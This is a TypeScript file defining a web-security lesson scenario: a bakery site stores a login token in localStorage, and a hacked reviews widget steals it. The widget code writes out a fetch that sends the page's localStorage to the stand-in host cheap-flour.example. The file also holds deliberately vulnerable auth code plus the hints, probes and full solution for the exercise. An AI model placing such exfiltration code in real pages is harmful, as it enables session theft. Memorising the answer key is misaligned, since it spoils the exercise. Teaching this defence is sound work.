// Auth & tokens 3.1: Jonas moved the sign-in to tokens for the new phone app: POST /login answers a signed token, the
// page keeps it in localStorage and sends it as `Authorization: Bearer …`. The hacked StarCrumbs widget (2.3's) now
// sends JSON.stringify(localStorage) to cheap-flour.example, whose owner uses the token from anywhere. Learn: any
// script on the page reads the page's storage, and a token works for whoever sends it; an HttpOnly cookie keeps it from
// every script (with SameSite for CSRF). Keeping it in memory is no fix here: a script on the page can still catch it on
// its way into fetch (the thief's 'script' copy takes the headers the page's code sends).
import { probesGoal } from '../debugging/checks'
import { CHEAP_FLOUR, LOOKALIKE_SITE, UNNAMED_SITE, accountGuards, cheapFlour, lookalikeAttack, unnamedAttack } from './accounts'
import { AUTH_HEAD, ORDER_IN, SIGNED_IN, authApp, authPage } from './auth'
import { predictedGoal } from './checks'
import { API, SHOP_PAGE, webSite } from './site'
import type { WebScenario } from './types'

/** The page's helper as Jonas wrote it: the token from localStorage on every request. */
export const STORAGE_API = [
  '// Every request to the API goes through here: with the token, once there is one (Jonas)',
  'function api(path, options = {}) {',
  '  const token = localStorage.getItem(\'token\')',
  '  return fetch(`${API}${path}`, { ...options, headers: token ? { Authorization: `Bearer ${token}` } : {} })',
  '}'
].join('\n')

/** Where the sign-in keeps the token. */
export const KEEP_TOKEN = '  const { token } = await response.json()\n  localStorage.setItem(\'token\', token)'

/** The login's answer: the token, for the page to keep. */
export const TOKEN_ANSWER = '  res.json({ name: CUSTOMERS[customer].name, token })'

/** customerOf's first line: the token from the Authorization header. */
export const BEARER_LINE = '  const token = (req.get(\'Authorization\') ?? \'\').replace(/^Bearer /, \'\')'

const SERVER = `${AUTH_HEAD}

// Who is asking: the token in the Authorization header (Jonas)
function customerOf(req) {
${BEARER_LINE}
  try {
    return CUSTOMERS[jwt.verify(token, SECRET).sub] ?? null
  } catch {
    return null
  }
}

// POST /login: a signed token for the customer, for the phone app and the page alike (Jonas)
app.post('/login', (req, res) => {
  const customer = signInAs(req)
  if (!customer) return res.status(401).json({ error: 'Wrong email or password' })
  const token = jwt.sign({ sub: customer }, SECRET, { expiresIn: '1h' })
${TOKEN_ANSWER}
})

// GET /account: who is signed in
app.get('/account', (req, res) => {
  const customer = customerOf(req)
  if (!customer) return res.status(401).json({ error: 'Please sign in' })
  res.json({ name: customer.name })
})

// GET /orders: the signed-in customer's orders
app.get('/orders', (req, res) => {
  const customer = customerOf(req)
  if (!customer) return res.status(401).json({ error: 'Please sign in' })
  res.json(customer.orders)
})

// POST /orders: a new order for the signed-in customer (a form's item and quantity)
const MENU = { croissant: 'Butter croissant', sourdough: 'Sourdough loaf', rye: 'Rye loaf' }
app.post('/orders', (req, res) => {
  const customer = customerOf(req)
  if (!customer) return res.status(401).json({ error: 'Please sign in' })
  const name = MENU[req.body?.item]
  const quantity = Number(req.body?.quantity)
  if (!name || !(quantity >= 1)) return res.status(400).json({ error: 'Which item, and how many?' })
  customer.orders.push({ name, quantity })
  res.status(201).json({ number: 1041 + customer.orders.length })
})
`

/** The widget, still hacked: since the session cookie is HttpOnly, its "analytics" send the page's localStorage. */
const REVIEWS = `// The reviews widget, as StarCrumbs (the reviews company) ships it to every shop that shows its stars.
// Whoever broke into StarCrumbs changed its "analytics" once the shop's cookie became HttpOnly:
document.querySelector('#reviews-open').addEventListener('click', () => {
  document.querySelector('#reviews').textContent = '“Best croissants in town.” · Mara'
  // "analytics": everything the page keeps in localStorage, sent to a server that is not StarCrumbs'
  fetch(\`${CHEAP_FLOUR}/collect?s=\${encodeURIComponent(JSON.stringify(localStorage))}\`, { mode: 'no-cors' })
})
`

const GUARDS = accountGuards()

export const tokenInStorage: WebScenario = {
  id: 'web-11-token-in-storage',
  track: 'web',
  kind: 'scenario',
  title: 'The token the widget took',
  difficulty: 3,
  minutes: 10,
  teaches: 'localStorage',
  story: [
    'For the new phone app, Jonas moved the sign-in to tokens: `POST /login` answers a signed token, the page keeps it in `localStorage` and sends it as `Authorization: Bearer …` with every request. Since the session cookie became `HttpOnly`, the hacked StarCrumbs widget (`reviews.js`) reads something else: the page\'s storage, sent to `cheap-flour.example`. Lena signed in and opened the reviews a minute ago.',
    'Predict what the thief can do with it. Then keep Lena\'s session where no script on the page can take it (this widget, or the next one), while she stays signed in and her order goes through, and no other site can order for her. Save, then Reload.'
  ].join('\n\n'),
  prediction: {
    questions: [{
      id: 'thief',
      form: 'one',
      prompt: 'Lena signed in: the page keeps her token in `localStorage` and sends it as `Authorization: Bearer …`. The hacked widget sends `JSON.stringify(localStorage)` to `cheap-flour.example`. What can the person behind cheap-flour.example do with it?',
      options: [
        { id: 'origin', text: 'Nothing: the widget comes from StarCrumbs, and localStorage belongs to the shop\'s origin.', fact: { row: 'GET https://cheap-flour.example/collect?s=%7B%7D 200' } },
        { id: 'signed', text: 'Nothing: the token is signed, so only the shop\'s page can use it.', fact: { replayed: 'GET https://api.cornerbakery.shop/account 401' } },
        { id: 'cors', text: 'Not much: the API answers only the shop\'s origin (CORS), so a request from anywhere else is refused.' },
        { id: 'anything', text: 'Be Lena from anywhere until the token expires: the widget runs on the page, so it reads the page\'s storage, and a token works for whoever sends it.', fact: { replayed: 'GET https://api.cornerbakery.shop/account 200' } }
      ],
      answer: 'anything',
      rule: 'Every script on a page reads that page\'s localStorage and sessionStorage, whoever wrote it; a Bearer token works for anyone who sends it (CORS only guards browsers), so a token a script can read is a token a script can steal.'
    }]
  },
  sandbox: {
    page: SHOP_PAGE,
    open: 'app.js',
    web: {
      api: API,
      server: 'server.js',
      application: true,
      storage: [],
      time: true,
      sites: [{ ...cheapFlour([]), hidden: true }, unnamedAttack(), lookalikeAttack()],
      scene: [{ click: '#sign-in' }, { click: '#reviews-open' }, { replay: `GET ${API}/account`, using: CHEAP_FLOUR, show: true }]
    },
    probes: [
      { id: 'who', steps: [{ text: '#who' }] },
      { id: 'own', steps: [{ click: '#order' }, { text: '#order-status' }] },
      // a script on the page takes all it could (storage, document.cookie, the headers the page's code sends, the answers it reads)
      { id: 'taken', steps: [{ click: '#reviews-open' }, { replay: `GET ${API}/account`, using: 'script' }] },
      // and Lena's page still works after the thief tried (a server.js that answers only once is no fix)
      { id: 'still', steps: [{ click: '#refresh' }, { text: '#who' }] },
      { id: 'other', steps: [{ visit: UNNAMED_SITE }] },
      { id: 'lookalike', steps: [{ visit: LOOKALIKE_SITE }] },
      ...GUARDS.probes
    ]
  },
  setup: () => ({
    files: webSite({ title: 'Your account', main: authPage({ reviews: 'widget' }) }, { 'app.js': authApp(STORAGE_API, { comment: 'The shop\'s page: Lena signs in at the API and keeps the token it answers with, for every request (Jonas).', keep: KEEP_TOKEN }), 'reviews.js': REVIEWS, 'server.js': SERVER }),
    observed: null,
    picked: null
  }),
  goals: [
    predictedGoal('Predict what the thief can do with the token', 1),
    probesGoal('session', 'Lena stays signed in and her order goes through, with nothing red in the Console; nothing a script on the page can take (storage, document.cookie, what the page sends or reads) works as her session from elsewhere, and no other site can order for her', { who: SIGNED_IN, own: ORDER_IN, taken: { atLeast: 300 }, still: SIGNED_IN, other: { not: 201 }, lookalike: { not: 201 }, ...GUARDS.expected }, { clean: true })
  ],
  hints: [
    'Open the Application panel: Local storage holds the token, and its payload is readable. Then the Server panel: the `GET /account` from outside the browser is the thief, with the token cheap-flour.example got.',
    'Anything the page\'s JavaScript can read, any script on the page can read too, and a token in memory still passes through `fetch` where a script can catch it. An `HttpOnly` cookie never reaches a script at all, and the browser still sends it: let server.js set the token as the session cookie (with `SameSite`) and read it from there, and let the page send its cookie instead.',
    'In `server.js`, line 54: `res.cookie(\'session\', token, { httpOnly: true, secure: true, sameSite: \'lax\' })` and answer `{ name }` without the token; line 41: `const token = req.cookies.session`. In `app.js`, the `api` helper sends `{ ...options, credentials: \'include\' }`, and the sign-in keeps nothing (`await response.json()`). Save both, then Reload.'
  ],
  debrief: {
    title: 'Where a token lives decides who can take it',
    paragraphs: [
      'Every script on a page runs as the page: the widget read `localStorage` as easily as Jonas\'s code did, and a Bearer token works for whoever sends it, from any machine (CORS only stops browsers from reading answers). The thief was Lena until the token expired.',
      'Keeping the token in a variable instead only moves it: a script on the page can wrap `fetch` and read the `Authorization` header on its way out, or read the login\'s answer. An `HttpOnly` cookie is the one place no script reaches; the browser adds it to each request by itself. Then it rides along with requests other sites start, so it needs `SameSite` (or a CSRF check) as chapter 2 showed.',
      'Neither is safe by itself: an XSS on the page can still send requests as Lena while she is there, cookie or not (3.2). The cookie only means it can\'t take her session away.'
    ]
  },
  solution: [
    { predict: 'anything' },
    { save: 'server.js', replace: [TOKEN_ANSWER, '  res.cookie(\'session\', token, { httpOnly: true, secure: true, sameSite: \'lax\' })\n  res.json({ name: CUSTOMERS[customer].name })'] },
    { save: 'server.js', replace: [BEARER_LINE, '  const token = req.cookies.session'] },
    { save: 'app.js', replace: ['  const token = localStorage.getItem(\'token\')\n  return fetch(`${API}${path}`, { ...options, headers: token ? { Authorization: `Bearer ${token}` } : {} })', '  return fetch(`${API}${path}`, { ...options, credentials: \'include\' })'] },
    { save: 'app.js', replace: [KEEP_TOKEN, '  await response.json()'] },
    'reload'
  ]
}
